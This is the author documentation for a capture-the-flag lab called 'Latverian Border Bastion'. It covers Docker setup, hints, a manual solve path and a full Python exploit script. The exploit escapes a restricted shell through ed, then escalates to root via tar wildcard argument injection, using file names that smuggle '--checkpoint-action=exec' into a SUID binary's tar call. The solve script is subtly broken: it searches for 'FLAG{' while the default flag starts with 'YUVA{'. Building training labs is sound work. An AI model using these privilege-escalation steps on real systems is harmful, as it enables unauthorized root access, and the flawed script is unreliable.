# Challenge 01: Latverian Border Bastion

## 1. Challenge Overview & Quick Reference

| Attribute | Value |
|---|---|
| **Challenge Name** | Latverian Border Bastion |
| **Directory** | `01-latverian-bastion` |
| **Category** | Shell / Linux Security / Privilege Escalation |
| **Difficulty** | Medium (Stage 1) |
| **Target Solve Time** | ~10 minutes |
| **Connection** | `ssh border-guard@<host> -p 2222` |
| **Default Password** | `latveria_guard` |
| **Default Static Flag** | `YUVA{d00m_d03s_n0t_t0l3r4t3_1ntrud3rs_7491}` |
| **Dynamic Env Vars** | `FLAG` (flag override), `CTF_PASSWORD` (password override) |
| **Handouts** | Connection credentials provided in challenge briefing |

---

## 2. Clear Objective

The objective is to compromise the Latverian border telemetry outpost, break out of Doctor Doom's restricted shell (`rbash`), identify and exploit an unsafe SUID telemetry monitoring binary, escalate privileges to `root`, and extract the secret flag from `/flag.txt`.

The flag is strictly stored at `/flag.txt` and `/root/flag.txt` with permissions `chmod 400` owned by `root:root`. An unprivileged user cannot view or read it without full privilege escalation.

---

## 3. Architecture & Story ("Vulnerability First")

### The Story
You have intercepted an unprivileged telemetry terminal on a remote Latverian border outpost (`bastion-01.latveria.gov`). The terminal operator `border-guard` has been locked down under Doctor Doom's restricted shell environment. Doom's central castle infrastructure periodically syncs outpost sensor logs via an automated maintenance daemon running with full root authority.

### Intended Technical Concept
```
[SSH Session (:2222)]
        │
        ▼
[Restricted Shell (rbash)] ──(ed editor escape '!/bin/bash')──► [Unrestricted Bash]
                                                                        │
                                                                        ▼
                                                        [SUID Binary /usr/local/bin/doom-monitor]
                                                                        │
                                                        (Calls 'tar -czf ... *' with wildcards)
                                                                        │
                                                                        ▼
                                                        [Tar Wildcard Argument Injection]
                                                        (--checkpoint=1, --checkpoint-action=exec)
                                                                        │
                                                                        ▼
                                                        [Root Privilege Escalation ──► /flag.txt]
```

1. **Restricted Shell (`rbash`)**: Locks user into `/home/border-guard/bin` containing only a minimal set of symlinks (`cat`, `date`, `ed`, `ls`, `whoami`).
2. **Editor Escape**: The line editor `ed` allows executing system commands via the `!` escape sequence.
3. **SUID Wildcard Injection**: `/usr/local/bin/doom-monitor` runs as root and archives `/var/log/latveria/telemetry/*` using an unquoted wildcard `*`. By creating files named `--checkpoint=1` and `--checkpoint-action=exec=sh payload.sh`, the attacker manipulates `tar` flags to execute code as `root`.

---

## 4. How to Run on Any System (Quick Spin-Up)

To spin up this challenge on any machine with Docker and Docker Compose:

### 1. Build and Start the Container
```bash
cd 01-latverian-bastion
docker compose up -d --build
```

### 2. Verify Port & Access
```bash
# Check if the SSH daemon is listening on port 2222
ssh -o StrictHostKeyChecking=no -p 2222 border-guard@127.0.0.1
# Password: latveria_guard
```

### 3. Spin Up with Custom Dynamic Flag & Password
```bash
FLAG="FLAG{custom_dynamic_flag_for_team_1}" CTF_PASSWORD="team1_secure_pass" docker compose up -d --build
```

### 4. Teardown
```bash
docker compose down
```

---

## 5. Progressive Hints

- **Hint 1 (Reconnaissance)**: Check your environment variables and what binaries exist in `~/bin`. Can any of the available tools execute external subcommands or line-editor escape sequences?
- **Hint 2 (Privilege Escalation Discovery)**: Find all SUID binaries on the filesystem using `find / -perm -4000 2>/dev/null`. Inspect the strings of any non-standard binaries in `/usr/local/bin`.
- **Hint 3 (Exploitation Vector)**: Notice how `/usr/local/bin/doom-monitor` invokes `tar -czf ... *` in the telemetry directory. Look up Unix wildcard argument injection with GNU `tar` (`--checkpoint` and `--checkpoint-action`).

---

## 6. Step-by-Step Intended Solve Path

1. **Log in via SSH**:
   ```bash
   ssh -o StrictHostKeyChecking=no -p 2222 border-guard@127.0.0.1
   # Password: latveria_guard
   ```

2. **Escape `rbash`**:
   Launch `ed`:
   ```text
   ed
   !/bin/bash
   ```
   Reset the standard path:
   ```bash
   export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
   ```

3. **Locate SUID Binaries**:
   ```bash
   find / -perm -4000 2>/dev/null
   # Result includes: /usr/local/bin/doom-monitor
   ```

4. **Arm the Tar Wildcard Payload**:
   Navigate to `/var/log/latveria/telemetry` (writable by group `guard`):
   ```bash
   cd /var/log/latveria/telemetry
   echo 'cat /flag.txt > /tmp/pwned_flag.txt; chmod 777 /tmp/pwned_flag.txt' > payload.sh
   chmod +x payload.sh
   touch './--checkpoint=1'
   touch './--checkpoint-action=exec=sh payload.sh'
   ```

5. **Execute SUID Binary**:
   ```bash
   /usr/local/bin/doom-monitor
   ```

6. **Retrieve the Flag**:
   ```bash
   cat /tmp/pwned_flag.txt
   # YUVA{d00m_d03s_n0t_t0l3r4t3_1ntrud3rs_7491}
   ```

---

## 7. Exact Solution Script Code & Execution

Run the automated Python exploit script from the challenge root:

```bash
python3 solution/solve.py 127.0.0.1 2222
```

### Complete Exploit Script (`solution/solve.py`):
```python
#!/usr/bin/env python3
"""
Automated solve script for Challenge 1: Latverian Border Bastion
Connects via SSH, escapes rbash using ed, exploits SUID tar wildcard injection, and retrieves the flag.
"""
import sys
import time
import subprocess

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = sys.argv[2] if len(sys.argv) > 2 else "2222"
USER = "border-guard"
PASSWORD = "latveria_guard"

def solve():
    print(f"[*] Targeting {USER}@{HOST}:{PORT}...")

    payload_commands = (
        "ed\n"
        "!/bin/sh\n"
        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
        "cd /var/log/latveria/telemetry\n"
        "echo 'cat /flag.txt > /tmp/pwned_flag.txt; chmod 777 /tmp/pwned_flag.txt' > payload.sh\n"
        "chmod +x payload.sh\n"
        "touch './--checkpoint=1'\n"
        "touch './--checkpoint-action=exec=sh payload.sh'\n"
        "/usr/local/bin/doom-monitor\n"
        "cat /tmp/pwned_flag.txt\n"
        "rm -f payload.sh './--checkpoint=1' './--checkpoint-action=exec=sh payload.sh'\n"
        "exit\n"
        "q\n"
        "exit\n"
    )

    try:
        cmd = [
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-p", str(PORT),
            f"{USER}@{HOST}"
        ]
        
        check_sshpass = subprocess.run(["which", "sshpass"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if check_sshpass.returncode == 0:
            full_cmd = ["sshpass", "-p", PASSWORD] + cmd
            proc = subprocess.Popen(full_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = proc.communicate(input=payload_commands, timeout=20)
            output = stdout + stderr
        else:
            try:
                import paramiko
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(HOST, port=int(PORT), username=USER, password=PASSWORD, timeout=10)
                channel = client.invoke_shell()
                channel.send(payload_commands)
                time.sleep(2)
                output = channel.recv(4096).decode('utf-8', errors='ignore')
                client.close()
            except ImportError:
                print("[-] paramiko and sshpass not installed. Please install paramiko or sshpass.")
                return

        for line in output.splitlines():
            if "FLAG{" in line:
                print(f"[+] Flag captured: {line.strip()}")
                return line.strip()

        print("[-] Flag not found in output. Raw output:")
        print(output)
    except Exception as e:
        print(f"[-] Exploit error: {e}")

if __name__ == "__main__":
    solve()
```

---

## 8. CTF Quality, Security & Anti-Shortcut Audit

- **Clear Objective**: The goal is unambiguous: break out of `rbash`, obtain root execution via SUID binary, and read `/flag.txt`.
- **No Unintended Shortcuts**:
  - The flag file (`/flag.txt`, `/root/flag.txt`) is `chmod 400` root-only.
  - The `border-guard` user has no sudo permissions.
  - Shell profiles (`.bash_profile`, `bin/`) are owned by root and cannot be modified to escape `rbash`.
  - Process environment is not leaked via debug endpoints.
- **Challenge Isolation**: The container runs OpenSSH in an isolated network namespace with unprivileged user sandboxing.
- **Resetability**: The entrypoint script creates the telemetry directory fresh on container boot. Multiple concurrent attempts on `/tmp` or telemetry are isolated if deployed per-team via CTFd Whale.
- **Security**: No real credentials or sensitive host assets are mounted into the container.
- **Performance**: Idle container consumes less than 20MB of RAM.

---

## 9. Author & Admin Notes

- If deploying behind a web terminal or CTFd Whale, set `CTF_PASSWORD` at launch to give each team distinct credentials.
- Detailed reference guide available in [GUIDE.md](file:///home/alucard/ch-j/01-latverian-bastion/GUIDE.md).
